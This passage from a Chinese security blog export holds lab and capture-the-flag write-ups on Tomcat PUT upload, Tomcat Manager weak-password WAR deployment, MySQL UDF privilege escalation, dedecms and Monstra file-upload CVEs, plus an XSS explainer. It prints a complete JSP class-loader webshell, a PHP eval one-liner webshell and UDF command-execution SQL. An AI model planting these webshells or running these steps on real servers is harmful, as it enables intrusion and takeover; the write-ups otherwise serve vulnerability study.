<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h5 id="3、GET修改为PUT，在文件名后面添加斜杠-来进行绕过"><a href="#3、GET修改为PUT，在文件名后面添加斜杠-来进行绕过" class="headerlink" title="3、GET修改为PUT，在文件名后面添加斜杠 &#x2F; 来进行绕过"></a><em>3、GET修改为PUT，在文件名后面添加斜杠 &#x2F; 来进行绕过</em></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps3.jpg"
                      alt="img"
                > </p>
<h5 id="4、写入jsp一句话木马"><a href="#4、写入jsp一句话木马" class="headerlink" title="4、写入jsp一句话木马"></a><em>4、写入jsp一句话木马</em></h5><p>&lt;%!</p>
<p>  class U extends ClassLoader {</p>
<p>​    U(ClassLoader c) {</p>
<p>​      super(c);</p>
<p>​    }</p>
<p>​    public Class g(byte[] b) {</p>
<p>​      return super.defineClass(b, 0, b.length);</p>
<p>​    }</p>
<p>  }</p>
<p>  public byte[] base64Decode(String str) throws Exception {</p>
<p>​    try {</p>
<p>​      Class clazz &#x3D; Class.forName(“sun.misc.BASE64Decoder”);</p>
<p>​      return (byte[]) clazz.getMethod(“decodeBuffer”, String.class).invoke(clazz.newInstance(), str);</p>
<p>​    } catch (Exception e) {</p>
<p>​      Class clazz &#x3D; Class.forName(“java.util.Base64”);</p>
<p>​      Object decoder &#x3D; clazz.getMethod(“getDecoder”).invoke(null);</p>
<p>​      return (byte[]) decoder.getClass().getMethod(“decode”, String.class).invoke(decoder, str);</p>
<p>​    }</p>
<p>  }</p>
<p>%&gt;</p>
<p>&lt;%</p>
<p>  String cls &#x3D; request.getParameter(“passwd”);</p>
<p>  if (cls !&#x3D; null) {</p>
<p>​    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</p>
<p>  }</p>
<p>%&gt;</p>
<h5 id="5、写入jsp一句话木马，进入该网址"><a href="#5、写入jsp一句话木马，进入该网址" class="headerlink" title="5、写入jsp一句话木马，进入该网址"></a><em>5、写入jsp一句话木马，进入该网址</em></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps4.jpg"
                      alt="img"
                > </p>
<p><em><strong>6、连接蚁剑，密码pass</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps5.jpg"
                      alt="img"
                > </p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps6.jpg"
                      alt="img"
                > </p>
<p><em><strong>7、进入该主目录下tmp，找到flag</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps7.jpg"
                      alt="img"
                > </p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat-pass-getshell弱口令漏洞复现</title>
    <url>/2023/08/24/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><em><strong>1、开启环境，进入网站</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps1.jpg"
                      alt="img"
                > </p>
<p><em><strong>2、点击Manager App，弱口令admin登录</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps2.jpg"
                      alt="img"
                > </p>
<p><em><strong>3、登陆成功</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps3.jpg"
                      alt="img"
                > </p>
<p><em><strong>4、制作jsp木马，下段jsp木马密码为：passwd，将下述代码保存为jsp格式，并将jsp格式文件打包压缩成为war文件格式进行上传。</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps4.jpg"
                      alt="img"
                > </p>
<p><em><strong>5、&#x2F;压缩包文件名&#x2F;一句话木马.jsp</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps5.jpg"
                      alt="img"
                > </p>
<p><em><strong>6、打开蚁剑，进行连接，连接成功！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps6.jpg"
                      alt="img"
                > </p>
<p><em><strong>7、查看主目录下的tmp文件，找到flag！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps7.jpg"
                      alt="img"
                > </p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>UDF提权</title>
    <url>/2023/08/21/UDF%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1>UFD提权</h1>

<p><strong>一、什么是udf</strong></p>
<p><strong>udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</strong></p>
<p><strong>udf 文件后缀一般为 dll，由C、C++编写</strong></p>
<p><strong>二、udf在渗透中的作用</strong></p>
<p><strong>在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</strong></p>
<h1 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a><strong>三、利用条件</strong></h1><p><strong>利用udf的条件其实还是挺苛刻的</strong></p>
<p><strong>mysql用户权限问题</strong></p>
<p><strong>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</strong></p>
<p><strong>拥有将udf.dll写入相应目录的权限。</strong></p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="四、数据库版本问题"><a href="#四、数据库版本问题" class="headerlink" title="四、数据库版本问题"></a><strong>四、数据库版本问题</strong></h1><p><strong>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</strong></p>
<p><strong>版本	路径</strong></p>
<p><strong>MySQL &lt; 5.0	导出路径随意；</strong></p>
<p><strong>5.0 &lt;&#x3D; MySQL&lt; 5.1	需要导出至目标服务器的系统目录（如：c:&#x2F;windows&#x2F;system32&#x2F;）</strong></p>
<p><strong>5.1 &lt; MySQL	必须导出到MySQL安装目录下的lib\plugin文件夹下</strong></p>
<p><strong>五、本地利用过程</strong></p>
<p><strong>1、获取Mysql安装路径</strong></p>
<p><strong>2、select @basedir</strong></p>
<p><strong>查看可操作路径</strong></p>
<p><strong>show global variables like “%secure%”</strong></p>
<p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p>
<p><strong>3、查看plugin目录路径</strong></p>
<p><strong>select @@plugin_dir</strong></p>
<p><strong>4、将dll上传方式推荐几种</strong></p>
<p><strong>将dll上传到安装路径的方式：</strong></p>
<p><strong>通过webshell上传</strong></p>
<p><strong>以hex方式直接上传</strong></p>
<p><strong>sqlmap中现有的udf文件，分为32位和64位，一定要选择对版本，获取sqlmap的udf方式</strong></p>
<p><strong>5、sqlmap中udf获取方式</strong></p>
<p><strong>自动化注入工具Sqlmap已经集成了此功能。</strong></p>
<p><strong>在 \sqlmap\data\udf\mysql\windows\64目录下存放着lib_mysqludf_sys.dll_</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091127823.png"
                      alt="image-20230821091127823"
                ></p>
<p><strong>可以利用sqlmap 自带的解码工具cloak.py，在sqlmap\extra\cloak中打开命令行，来对lib_mysqludf_sys.dll_进行解码在，然后在直接利用，输入下面的</strong></p>
<p><strong>cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091153900.png"
                      alt="image-20230821091153900"
                ></p>
<p><strong>接着就会在\sqlmap\data\udf\mysql\windows\64目录下生成一个dll的文件lib_mysqludf_sys.dll，这个我们就可以直接拿来利用</strong></p>
<p><strong>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</strong></p>
<p><strong>函数：</strong></p>
<p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
<p><strong>以我windows系统为例，mysql版本为MySQL5.7.26</strong></p>
<p><strong>注意：攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。</strong></p>
<p><strong>这里我改了个名字</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091217774.png"
                      alt="image-20230821091217774"
                ></p>
<p><strong>打开mysql执行以下语句：</strong></p>
<h5 id="create-function-sys-eval-returns-string-soname-udf-dll"><a href="#create-function-sys-eval-returns-string-soname-udf-dll" class="headerlink" title="create function sys_eval returns string soname &#39;udf.dll&#39;"></a><code>create function sys_eval returns string soname &#39;udf.dll&#39;</code></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091236187.png"
                      alt="image-20230821091236187"
                ></p>
<p><strong>执行成功，现在执行语句可查看ip</strong></p>
<h5 id="select-sys-eval-ipconfig"><a href="#select-sys-eval-ipconfig" class="headerlink" title="select sys_eval(&#39;ipconfig&#39;)"></a><code>select sys_eval(&#39;ipconfig&#39;)</code></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091253240.png"
                      alt="image-20230821091253240"
                ></p>
<h1 id="六、实战情况"><a href="#六、实战情况" class="headerlink" title="六、实战情况"></a><strong>六、实战情况</strong></h1><p><strong>为了将这个转换为十六进制，可以借助mysql中的hex函数，先将udf.dll移动到C盘中，这样路径也清晰一些，然后执行下面命令</strong></p>
<p><code>select hex(load_file(&#39;C:/udf.dll&#39;)) into dumpfile &#39;c:/udf.txt&#39;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091323641.png"
                      alt="image-20230821091323641"
                ></p>
<p><strong>成功生成了十六进制形式流！</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091338213.png"
                      alt="image-20230821091338213"
                ></p>
<p><strong>后面还有很多好玩的内容，大家可以自行去琢磨研究，感谢大家！</strong></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>dedecms文件上传(CVE-2019-8933)漏洞复现</title>
    <url>/2023/08/24/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><em><strong>1.第一步，打开环境，这里我用的是80：14882端口</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174353400.png"
                      alt="image-20230824174353400"
                ></p>
<p><em><strong>2.点击上传跳转页面</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174418389.png"
                      alt="image-20230824174418389"
                ></p>
<p><em><strong>3.在upload&#x2F;后写dede进入到该管理后台</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174441418.png"
                      alt="image-20230824174441418"
                ></p>
<p><em><strong>4.点击模板，进入到默认模板管理</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174503674.png"
                      alt="image-20230824174503674"
                ></p>
<p><em><strong>5.新建模板</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174518062.png"
                      alt="image-20230824174518062"
                ></p>
<p><em><strong>6.在后台输入一句话木马<?php eval($_POST[123]);?>点击保存</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174605190.png"
                      alt="image-20230824174605190"
                ></p>
<p><em><strong>7.生成-更新主页HTML-浏览选择新建的模板-更改后缀为php</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174619578.png"
                      alt="image-20230824174619578"
                ></p>
<p> <img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174632722.png"
                      alt="image-20230824174632722"
                ></p>
<p><em><strong>8.使用蚁剑连接<a class="link"   href="http://192.168.2.211:14882/uploads/index.php" >http://192.168.2.211:14882/uploads/index.php<i class="fas fa-external-link-alt"></i></a></strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174659762.png"
                      alt="image-20230824174659762"
                ></p>
<p><em><strong>9.连接成功！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174712986.png"
                      alt="image-20230824174712986"
                ></p>
<p><em><strong>10.成功在主目录下tmp文件夹中找到flag！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174729905.png"
                      alt="image-20230824174729905"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>monstra文件上传(CVE-2020-13384)漏洞复现</title>
    <url>/2023/08/24/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2020-13384)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><em><strong>1、打开环境，注册账号账号密码统一设置为admin方便记忆，<a class="link"   href="mailto:&#49;&#x32;&#51;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#109;" >&#49;&#x32;&#51;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>设置为邮箱</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps8.jpg"
                      alt="img"
                > </p>
<p><em><strong>2、点击logged in</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps9.jpg"
                      alt="img"
                > </p>
<p><em><strong>3、点击upload file</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps10.jpg"
                      alt="img"
                > </p>
<p><em><strong>4、点击上传文件抓包</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps11.jpg"
                      alt="img"
                > </p>
<p><em><strong>5、修改文件名为phar,点击放行，可以看到文件上传成功，点击文件获取路径：</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps12.jpg"
                      alt="img"
                > </p>
<p><em><strong>6、直接查看目录tmp</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps13.jpg"
                      alt="img"
                > </p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps14.jpg"
                      alt="img"
                > </p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞详解</title>
    <url>/2023/08/11/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="一、XSS漏洞原理"><a href="#一、XSS漏洞原理" class="headerlink" title="一、XSS漏洞原理"></a><strong>一、XSS漏洞原理</strong></h3><p>XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。</p>
<p>当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。</p>
<h3 id="二、XSS漏洞的危害"><a href="#二、XSS漏洞的危害" class="headerlink" title="二、XSS漏洞的危害"></a><strong>二、XSS漏洞的危害</strong></h3><p>（1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。<br>（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。<br>（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。<br>（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</p>
<h3 id="三、XSS漏洞的分类"><a href="#三、XSS漏洞的分类" class="headerlink" title="三、XSS漏洞的分类"></a>三、XSS漏洞的分类</h3><h5 id="1、反射型XSS"><a href="#1、反射型XSS" class="headerlink" title="1、反射型XSS"></a>1、反射型XSS</h5><p>反射型XSS，也称为非持久性XSS，是最常见的一种XSS。</p>
<p>XSS代码常常出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。</p>
<p>该类攻击的主要特点是它的及时性和一次性，即用户提交请求后，响应信息会立即反馈给用户。该类攻击常发生在搜索引擎、错误提示页面等对用户的输入做出直接反应的场景中。</p>
<h5 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h5><p>存储型XSS，也称为持久性XSS。</p>
<p>在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。</p>
<p>存储型XSS攻击的特点之一是提交的恶意内容会被永久存储，因而一个单独的恶意代码就会使多个用户受害，故被称为持久性XSS，它也是跨站脚本攻击中危害最的一类。二是被存储的用户提交的恶意内容不一定被页面使用，因此存在危险的响应信息不一定被立即返回，也许在访问那些在时间上和空间上没有直接关联的页面时才会引发攻击，因此存在不确定性和更好的隐蔽性。</p>
<p>这类攻击的一个典型场景是留言板、博客和论坛等，当恶意用户在某论坛页面发布含有恶意的Javascript代码的留言时，论坛会将该用户的留言内容保存在数据库或文件中并作为页面内容的一部分显示出来。当其他用户查看该恶意用户的留言时，恶意用户提交的恶意代码就会在用户浏览器中解析并执行。</p>
<h5 id="3、DOM型XSS"><a href="#3、DOM型XSS" class="headerlink" title="3、DOM型XSS"></a>3、DOM型XSS</h5><p>DOM (Document Objet Model)指文档对象模型。</p>
<p>DOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。客户端JavaScript可以访问浏览器的文档对象模型。也就是说，通过JavaScript代码控制DOM节点就可以不经过服务器端的参与重构HTML页面。</p>
<p>该类攻击是反射型XSS的变种。它通常是由于客户端接收到的脚本代码存在逻辑错误或者使用不当导致的。比如Javascript代码不正确地使用各种DOM方法(如document.write)和Javascript内部函数(如eval函数)，动态拼接HTML代码和脚本代码就容易引发DOM型的跨站脚本攻击。</p>
<p>因此，DOM型XSS与前面两种XSS的区别就在于DOM型XSS攻击的代码不需要与服务器端进行交互，DOM型XSS的触发基于浏览器端对DOM数据的解析来完成，也就是完全是客户端的事情。</p>
<p>4、判断是哪一种XSS<br>发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。</p>
<h3 id="四、XSS漏洞的检测与防御"><a href="#四、XSS漏洞的检测与防御" class="headerlink" title="四、XSS漏洞的检测与防御"></a>四、XSS漏洞的检测与防御</h3><h5 id="1、检测"><a href="#1、检测" class="headerlink" title="1、检测"></a>1、检测</h5><p>手工检测<br>手工检测重点要考虑数据输入的地方，且需要清楚输入的数据输出到什么地方。</p>
<p>在检测的开始，可以输入一些敏感字符，比如“&lt;、&gt;、（）”等，提交后查看网页源代码的变化以发现输入被输出到什么地方，且可以发现相关敏感字符是否被过滤。</p>
<p>手工检测结果相对准确，但效率较低。</p>
<p>工具检测<br>常用工具有AVWS（Acunetix Web Vulnerability Scanner）、BurpSuite等。还有一些专门针对XSS漏洞的检测工具，如：XSSer、XSSF（跨站脚本攻击框架）、BeEF(The Browser Exploitation Framework)等。</p>
<h5 id="2、防御"><a href="#2、防御" class="headerlink" title="2、防御"></a>2、防御</h5><p>●使用黑名单进行</p>
<p>●对HTML标签或特殊字符进行过滤</p>
<p>●使用内容安全的CSP</p>
<p>●使用设计上就会自动编码的框架，如：OWASP ESAPI、React JS、JSOUP等，对于JAVA而言，可以使用ESAPI.encoder().encodeForHTML()对字符串进行HTML编码。</p>
<p>●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码’、十六进制编码’、HTML编码&amp;apos、Unicode编码\u0027等）。</p>
<p>●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为”、单引号转化为&amp;apos、与转化 为&amp;等。</p>
<p>●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
</search>
